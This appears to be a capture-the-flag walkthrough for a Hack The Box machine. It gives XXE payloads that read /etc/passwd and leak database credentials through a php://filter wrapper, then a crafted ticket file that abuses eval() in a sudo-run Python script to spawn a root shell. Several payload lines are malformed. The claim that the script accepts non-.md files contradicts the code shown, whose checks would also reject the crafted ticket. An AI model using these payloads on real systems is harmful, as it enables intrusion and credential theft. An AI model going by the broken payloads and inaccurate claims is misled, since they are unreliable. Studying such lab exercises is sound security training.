<h3>HTB - Bughunter (easy)</h3>  
**bug**: xxe  

**nmap**  
``sudo nmap -sVC -p- -v -Pn -T5 rhost -oN nmap

**dir enum**  
``ffuf -u https://rhost/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic -c -e .php,.html,.txt,.js

![[Pasted image 20250505192056.png]]

go to https://rhost/portal.php    
check sources  
click https://rhost/log_submit.php  
open burp, capture request on submit  
you can see POST request to /tracker_diRPrOOf314.php  
check data to inspector  
the data is base64 and url encoded   

![[Pasted image 20250505191745.png]]

----
**exploitation thru XXE**   
capture POST request   
https://rhost/tracker_diRPrOOf314.php  
you can see XML format being rendered in frontend  
the `title` (entity) including its values are reflected  

**(encoding)**   
use Hackverter ext on burp suite  
select Encode tab  
select urlencode and base64  
  
  
**sensitive file read XXE**  
change the requested XML with this edited request  

```
data=@urlencode><@base64><?xml version-"1.0" encoding="ISO-8859-1"?>
<!DOCTYPE title
	<!ENTITY variable SYSTEM "file:///etc/passwd">
]>
<bugreport>
<title=&variable;</title>
<cwe>bisan unsa</cwe>
<cvss>6.9</cvss>
<reward>96969696</reward>
</bugreport></@base64></@urlencode>
```

![[Pasted image 20250505191530.png]]


**getting admin creds thru XXE php filtering wrapper**  
we can get the admin creds thru the ``db.php`` that we found on thru the directory bruteforce
data:  
```
data=@urlencode><@base64><?xml version-"1.0" encoding="ISO-8859-1"?>
<!DOCTYPE title
	<!ENTITY variable SYSTEM "php://filter/convert.base64-encode/resource=db.php">
]>
<bugreport>
<title=&variable;</title>
<cwe>bisan unsa</cwe>
<cvss>6.9</cvss>
<reward>96969696</reward>
</bugreport></@base64></@urlencode>
```

![[Pasted image 20250505192735.png]]

copy the td and go to terminal  
echo "the td data type shit" | base64 -d  
connect to the machine with SSH  

----
**finding privesc path**  

the user ``development`` has user privilege  
run ``sudo -l`` to check it  
now you can see a script that requrires ``NOPASSWD`` to run  

![[Pasted image 20250506105932.png]]

TicketValidator.py python script:  
```
#!/usr/bin/env python3

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for irregularities.
    code_line = None
    for i, x in enumerate(ticketFile.readlines()):
        if not x.startswith("# Skytrain Inc"):
            return False
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {''.join(x.strip().split(' ')[2:])}")
            continue
        if x.startswith("# Ticket Code: "):
            code_line = i+1
            continue
        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("*")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
            return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```

**flaws in the script**  
the script asks for a `.md` for tickets, but it still continues even if it's not `.md`  
so we can craft even a `.txt` file to act like a ticket and feed it to the script  
  
here's what i came up with  
```
# Skytrain Inc
## Ticket to Anywhere
# Ticket Code:
**__import__('os').system('/bin/sh')**
```

what it does is,   
it gives the script the minimum requirements it asks for tickets to be valid   
Line 1: `# Skytrain Inc` satisfies the first-line check.  
Line 2:` ## Ticket` to Anywhere meets the second-line requirement (the destination can be anything).  
Line 3: `# Ticket Code`: indicates the next line is the ticket code.  
Line 4: ``**__import__('os').system('/bin/sh')**`` is the payload.  

after that, it executes the `bin/sh` to spawn a root shell to the target machine
VOILA! BountyHunter PWNED!  